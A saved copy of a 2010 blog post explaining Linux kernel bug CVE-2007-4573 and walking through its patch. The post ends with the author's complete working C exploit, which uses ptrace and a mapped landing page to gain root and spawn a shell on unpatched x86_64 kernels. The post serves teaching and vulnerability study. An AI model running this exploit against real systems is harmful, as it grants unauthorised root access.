<!DOCTYPE html>
<!-- saved from url=(0079)https://blog.nelhage.com/2010/02/cve-2007-4573-the-anatomy-of-a-kernel-exploit/ -->
<html class="js video maskImage placeholder" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title>CVE-2007-4573: The Anatomy of a Kernel Exploit - Made of Bugs</title>
  <meta name="author" content="Nelson Elhage">

  
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
  <meta name="generator" content="Hugo 0.72.0">

  <link rel="canonical" href="https://blog.nelhage.com/2010/02/cve-2007-4573-the-anatomy-of-a-kernel-exploit/">
  <link href="https://blog.nelhage.com/favicon.png" rel="icon">
  <link href="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="https://blog.nelhage.com/atom.xml" rel="alternate" title="Made of Bugs" type="application/atom+xml">
  <script src="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/modernizr-2.0.js.‰∏ãËºâ"></script>
  <script src="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/jquery.min.js.‰∏ãËºâ"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/octopress.js.‰∏ãËºâ" type="text/javascript"></script>
<link href="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/css" rel="stylesheet" type="text/css">
  <link href="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/css(1)" rel="stylesheet" type="text/css">



</head>
<body class="collapse-sidebar sidebar-footer">
  <header role="banner">
    <hgroup>
      <h1><a href="https://blog.nelhage.com/">Made of Bugs</a></h1>
      <h3>It's software. It's made of bugs.</h3>
    </hgroup>
  </header>
  <div class="navi">
<ul>
  <li><a href="https://blog.nelhage.com/post/">Archives</a></li>
  <li><a href="https://blog.nelhage.com/subscribe">Subscribe</a></li>
  <li><a href="https://nelhage.com/">Author</a></li>
</ul>
</div>

  <div id="main">
    <div id="content">


<div>
  <article class="hentry" role="article">
    <header>
  <h1 class="entry-title">CVE-2007-4573: The Anatomy of a Kernel Exploit</h1>
  <p class="meta">
    
    <time datetime="2010-02-05T23:32:31Z" pubdate="">
      Feb  5, 2010
    </time>
    
  </p>
</header>

<div class="entry-content">
  <p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4573">CVE-2007-4573</a>
is two years old at this point, but it remains one of my favorite
vulnerabilities. It was a local privilege-escalation vulnerability on
all <code>x86_64</code> kernels prior to <code>v2.6.22.7</code>. It‚Äôs very simple to
understand with a little bit of background, and the exploit is
super-simple, but it‚Äôs still more interesting than Yet Another NULL
Pointer Dereference. Plus, it was the first kernel bug I wrote an
exploit for, which was fun.</p>
<p>In this post, I‚Äôll write up my exploit for CVE-2007-4573, and try to
give enough background for someone with some experience with C, Linux,
and a bit of x86 assembly to understand what‚Äôs going on. If you‚Äôre an
experienced kernel hacker, you probably won‚Äôt find much new here, but
if you‚Äôre not, hopefully you‚Äôll get a sense for some of the pieces
that go into a kernel exploit.</p>
<h2 id="the-patch">The patch&nbsp;<a class="anchor" href="https://blog.nelhage.com/2010/02/cve-2007-4573-the-anatomy-of-a-kernel-exploit/#the-patch"><i class="small linkify icon">	üîóÔ∏é</i></a> </h2>
<p>I‚Äôll start out with the patch, or rather a slightly simplified
version, that omits some hunks that will be irrelevant for my
discussion. Then I‚Äôll explain the context for the patch, and by that
point we‚Äôll have enough context to understand the exploit code.</p>
<p>A simplified version of the patch follows (The original is
<a href="http://git.kernel.org/linus/176df2457ef6207156ca1a40991c54ca01fef567"><code>176df245</code></a>
in linus‚Äôs git repository) Note that this patch was applied to v2.6.22
‚Äì These files have moved around, so pull out an older kernel if
you‚Äôre trying to follow along at home:</p>
<pre><code>--- a/arch/x86_64/ia32/ia32entry.S
+++ b/arch/x86_64/ia32/ia32entry.S
@@ -38,6 +38,18 @@
        movq    %rax,R8(%rsp)
        .endm

+       .macro LOAD_ARGS32 offset
+       movl \offset(%rsp),%r11d
+       movl \offset+8(%rsp),%r10d
+       movl \offset+16(%rsp),%r9d
+       movl \offset+24(%rsp),%r8d
+       movl \offset+40(%rsp),%ecx
+       movl \offset+48(%rsp),%edx
+       movl \offset+56(%rsp),%esi
+       movl \offset+64(%rsp),%edi
+       movl \offset+72(%rsp),%eax
+       .endm
@@ -334,7 +346,7 @@ ia32_tracesys:
        movq $-ENOSYS,RAX(%rsp) /* really needed? */
        movq %rsp,%rdi        /* &amp;pt_regs -&gt; arg1 */
        call syscall_trace_enter
-       LOAD_ARGS ARGOFFSET  /* reload args from stack in case ptrace changed it */
+       LOAD_ARGS32 ARGOFFSET  /* reload args from stack in case ptrace changed it */
        RESTORE_REST
        jmp ia32_do_syscall
 END(ia32_syscall)
</code></pre>
<p>The patch defines the <code>IA32_LOAD_ARGS</code> macro, and replaces <code>LOAD_ARGS</code>
with it in several places (I‚Äôve only shown one for
simplicity). <code>LOAD_ARGS32</code> differs only slightly from the <code>LOAD_ARGS</code>
macro that it is replacing, which is defined in
<code>include/asm-x86_64/calling.h</code>:</p>
<pre><code>.macro LOAD_ARGS offset
movq \offset(%rsp),%r11
movq \offset+8(%rsp),%r10
movq \offset+16(%rsp),%r9
movq \offset+24(%rsp),%r8
movq \offset+40(%rsp),%rcx
movq \offset+48(%rsp),%rdx
movq \offset+56(%rsp),%rsi
movq \offset+64(%rsp),%rdi
movq \offset+72(%rsp),%rax
.endm
</code></pre>
<p>As the name suggests, <code>LOAD_ARGS32</code> loads the registers from the stack
as 32-bit values, rather than 64-bit. Importantly, in doing so it
takes advantage of a quirk in the <code>x86_64</code> architecture, that causes
the top 32 bits of the registers to be zeroed if you write to the
32-bit versions. <code>LOAD_ARGS32</code> thus zero-extends the 32-bit values it
loads into the 64-bit registers.</p>
<h2 id="system-call-handling">System call handling&nbsp;<a class="anchor" href="https://blog.nelhage.com/2010/02/cve-2007-4573-the-anatomy-of-a-kernel-exploit/#system-call-handling"><i class="small linkify icon">	üîóÔ∏é</i></a> </h2>
<p>So, why is this patch so important? Let‚Äôs look at the context for the
<code>LOAD_ARGS</code> ‚Üí <code>LOAD_ARGS32</code> change. <code>ia32entry.S</code> contains the
definitions for entry-points for 32-bit compatibility-mode system
calls on an <code>x86_64</code> processor. In other words, for 32-bit processes
running on the 64-bit machine, or for 64-bit processes that use
old-style <code>int $0x80</code> system calls for whatever reason.</p>
<p>There are three entry points in the file, one for 32-bit <code>SYSCALL</code>
instructions, one for 32-bit <code>SYSENTER</code>, and one for <code>int $0x80</code>. They
are all very similar, and we will only consider the <code>int $0x80</code> case
here. At boot-time, Linux configures the processor so that <code>int $0x80</code>
will dispatch to the <code>ia32_syscall</code> entry point. Ignoring a bunch of
debugging information, tracing, and other junk, this entry point‚Äôs
code is essentially simple:</p>
<pre><code>ENTRY(ia32_syscall)
        movl %eax,%eax

        pushq %rax
        SAVE_ARGS 0,0,1

        GET_THREAD_INFO(%r10)
        orl   $TS_COMPAT,TI_status(%r10)
        testl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%r10)
        jnz ia32_tracesys

        cmpl $(IA32_NR_syscalls-1),%eax
        ja ia32_badsys

ia32_do_call:
        IA32_ARG_FIXUP
        call *ia32_sys_call_table(,%rax,8)

        movq %rax,RAX-ARGOFFSET(%rsp)
        jmp int_ret_from_sys_call
</code></pre>
<p><code>%eax</code>, according to Linux‚Äôs syscall convention, stores the syscall number. The <code>mov</code> zero-extends it into <code>%rax</code>, and then we save it and the syscall arguments onto the stack.</p>
<p>The next block retrieves the <code>struct thread_info</code> for the current task,  sets the <code>TS_COMPAT</code> status bit to indicate that we‚Äôre handling a 32-bit compatibility mode syscall, and then
checks the thread‚Äôs flags to determine whether this thread has been flagged for extra processing on syscall entry. If so, we jump away to
code to handle that work.</p>
<p>Next (at the <code>cmpl</code>), we check to make sure that the requested syscall is in-bounds, and branch to an error path if not.</p>
<p><code>IA32_ARG_FIXUP</code> is a simple macro that moves registers around to
translate between the Linux syscall calling convention and the
<code>x86_64</code> calling convention, which each hold arguments in different
registers. Once we‚Äôve fixed up the registers, the <code>call</code> instruction indexes the system call table by the system call number, looks up the address stored there, and calls into it to dispatch the syscall.</p>
<p>Finally, we save the return code from the system call into the register area on the stack, and jump to code to handle the return to userspace.</p>
<hr>
<p>One thing we should notice about this code is that when we
check that the syscall is in bounds, we compare against the 32-bit
<code>%eax</code> register, but when we actually dispatch the syscall, we use
the full 64 bits in <code>%rax</code>. The <code>movl</code> at the top of the function serves to zero-extend <code>%eax</code>, so that normally, the top 32 bits of <code>%rax</code> are zero, and this distinction doesn‚Äôt matter.</p>
<p>The problem arises in the ‚Äútraced‚Äù path in <code>ia32_tracesys</code>, which is (again, with some
extra code removed):</p>
<pre><code>ia32_tracesys:
        movq %rsp,%rdi        /* &amp;pt_regs -&gt; arg1 */
        call syscall_trace_enter
        LOAD_ARGS ARGOFFSET  /* reload args from stack in case ptrace changed it */
        jmp ia32_do_call
</code></pre>
<p>Essentially, <code>ia32_tracesys</code> just calls into the C function
<code>syscall_trace_enter</code>, with a pointer to the registers saved on the stack,
and then restores the register values from the stack and jumps back to
execute the system call.</p>
<p>Herein lies the problem. If <code>syscall_trace_enter</code> replaces the on-stack <code>%rax</code> with a 64-bit value, and <code>LOAD_ARGS</code> restores it, then the <code>%eax</code>/<code>%rax</code> distinction above becomes a problem.
Aas long as <code>%eax</code> is less than <code>(IA32_NR_syscalls-1)</code>, <code>%rax</code> can be much larger than the size of the syscall table, causing the <code>call</code> to index off the end of it.</p>
<h2 id="ptrace2">ptrace(2)&nbsp;<a class="anchor" href="https://blog.nelhage.com/2010/02/cve-2007-4573-the-anatomy-of-a-kernel-exploit/#ptrace2"><i class="small linkify icon">	üîóÔ∏é</i></a> </h2>
<p>So what happens inside <code>syscall_trace_enter</code>, and how can we take
advantage of that to load a 64-bit value into the restored <code>%rax</code>?
Well, that turns out to be the code that handles processes traced by
the <code>ptrace(2)</code> process-tracing mechanism, which among other things,
allows the tracer to stop a child process before each system call, and
inspect and modify the child‚Äôs registers for the system call procedes.</p>
<p>Reading <code>ptrace(2)</code>, we find that we can use <code>ptrace(PTRACE_SYSCALL,‚Ä¶)</code>
to cause a process to execute until its next system call, and then,
once it‚Äôs stopped, we can use <code>ptrace(PTRACE_POKEUSER,‚Ä¶)</code> to modify
the tracee‚Äôs registers.</p>
<h2 id="putting-it-all-together">Putting it all together&nbsp;<a class="anchor" href="https://blog.nelhage.com/2010/02/cve-2007-4573-the-anatomy-of-a-kernel-exploit/#putting-it-all-together"><i class="small linkify icon">	üîóÔ∏é</i></a> </h2>
<p>So, to exploit this bug, we need to:</p>
<ul>
<li>Have a 64-bit process attach to some process with <code>ptrace</code>.</li>
<li>Use <code>PTRACE_SYSCALL</code> to stop that process at its next syscall</li>
<li>Have the process execute an <code>int $0x80</code></li>
<li>Have the parent modify <code>%rax</code> in the child to be 64 bits wide, and
allow the child to continue.</li>
</ul>
<p>At this point, the child will index waaay off the end of the syscall
table ‚Äì so far off, in fact, that it will wrap around past the end of
memory (On <code>x86_64</code>, the entire kernel is mapped into the last
2 GB of address space). Since the kernel and user programs run in the same
address space, this means that, with an appropriate choice of <code>%rax</code>, the kernel will dereference an address
in the user address space to find out the address of the function it should jump to in order to handle the system call.</p>
<p>My entire exploit code follows.  This is not fully weaponized at all
‚Äì it depends on tweaking for the specific target kernel, for one, but
it works. (Well, if you can find an unpatched kernel anywhere any more
these days, it works). Nowadays, if I were writing an exploit like
this, I‚Äôd plug it into something like Brad Spengler‚Äôs
<a href="http://www.milw0rm.com/exploits/9627">Enlightenment</a>, which takes
care of most of the annoying bits of executing shell-code in-kernel to
change the current user, disable any security modules that might be
problematic, and work across kernel versions, as necessary.</p>
<pre><code>#include &lt;sys/ptrace.h&gt;
#include &lt;sys/user.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stddef.h&gt;

/**
 * Replace these with the values of `ia32_sys_call_table' and
 * `set_user' from /proc/kallsyms or /boot/System.map-$(uname -r)
 */
#define syscall_table 0xffffffff8044b8a0
#define set_user      0xffffffff8028d785

/*
 We don't _need_ these -- with only a little bit of cleverness, we can
 get around not knowing them, but having them will make the code
 simpler.

 set_user is defined in kernel/sys.c, and can be used to change the
 UID of the current process. We'll trick the kernel into call it on
 our behalf, and thus avoid having to write any code to run in
 kernel-mode ourselves.
*/

#define offset        (1L &lt;&lt; 32)
#define landing       (syscall_table + 8*offset)
/*
  'offset' is the 64-bit value we will load into %rax using ptrace().

  This will cause the "call" instruction we saw above to look up the
  value stored at that index off the syscall table, which is the
  address we compute in "landing".
 */


int main() {
        if((signed long)mmap((void*)(landing&amp;~0xFFF), 4096,
                              PROT_READ|PROT_EXEC|PROT_WRITE,
                              MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
                                0, 0) &lt; 0) {
                perror("mmap");
                exit(-1);
        }
        *(long*)landing = set_user;
        /*
          We use mmap(2) to map a page at "landing", and write a
          pointer to the set_user function there.
         */

        pid_t child;
        child = fork();
        /*
          We fork two processes. The parent will ptrace the child, and
          the child will execute the `int 0x80` syscall.
         */
        if(child == 0) {
                ptrace(PTRACE_TRACEME, 0, NULL, NULL);
                kill(getpid(), SIGSTOP);
                /*
                  We ask for someone to trace us, and then signal
                  ourselves, which causes us to wait for our parent to
                  attach via `ptrace`.
                 */
                __asm__("movl $0, %ebx\n\t"
                        "int $0x80\n");
                /*
                  We then make an (arbitrary) syscall via int 0x80,
                  with %ebx set to 0. Linux's system call convention
                  stores the first argument in %ebx, so if all goes
                  right, when our parent mucks with %rax, this will
                  result in the kernel calling set_user(0), setting
                  our current UID to 0.
                */

                execl("/bin/sh", "/bin/sh", NULL);
                /* Once we have root, we exec a shell. */
        } else {
                wait(NULL);
                ptrace(PTRACE_SYSCALL, child, NULL, NULL);
                wait(NULL);
                ptrace(PTRACE_POKEUSER, child, offsetof(struct user, regs.orig_rax),
                        (void*)offset);
                ptrace(PTRACE_DETACH, child, NULL, NULL);
                wait(NULL);
                /*
                  In the parent we need to do is `wait` for the child
                  to stop, allow it to advance until the next syscall,
                  use `PTRACE_POKEUSER` to poke `offset` into `%rax`,
                  and then detach and let it run.
                 */
        }
}
</code></pre>


</div>

    <footer>

      <div class="c2a">
        <form action="https://buttondown.email/api/emails/embed-subscribe/nelhage" method="post" target="popupwindow" onsubmit="window.open(&#39;https://buttondown.email/nelhage&#39;, &#39;popupwindow&#39;)" class="embeddable-buttondown-form">
          <p>
            <label for="bd-email">Subscribe to my newsletter (~1 post/week and blog updates):</label>
          </p>
          <p>
          <input type="email" name="email" placeholder="email@domain.com" id="bd-email">
          <input type="hidden" value="1" name="embed">
          <input type="submit" value="Subscribe">
          </p>
          <p>
            <a href="https://buttondown.email/" target="_blank">Powered by Buttondown.</a>
          </p>
        </form>
      </div>

    <p class="meta">
      
        <a class="basic-alignment left" href="https://blog.nelhage.com/2010/01/git-in-pictures/" title="Previous Post: Git in pictures">¬´ Git in pictures</a>
      
      
        <a class="basic-alignment right" href="https://blog.nelhage.com/2010/02/versioning-dotfiles-in-git/" title="Next Post: Versioning dotfiles in git">Versioning dotfiles in git ¬ª</a>
      
    </p>
  </footer>
</article>
</div>

<hr>

</div>
</div>
<footer role="contentinfo">

  <p>
    <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">
      <img alt="Creative Commons License" style="border-width:0" src="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/88x31.png">
    </a>
    <br>
    <span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Made of Bugs</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://nelhage.com/" property="cc:attributionName" rel="cc:attributionURL">Nelson Elhage</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative
    Commons Attribution 4.0 International License</a>.
  </p>
</footer>
<script async="" defer="" src="./2010 - CVE-2007-4573 The Anatomy of a Kernel Exploit_files/latest.js.‰∏ãËºâ"></script>
<noscript><img src="https://sa.nelhage.com/noscript.gif" alt=""/></noscript>



</body></html>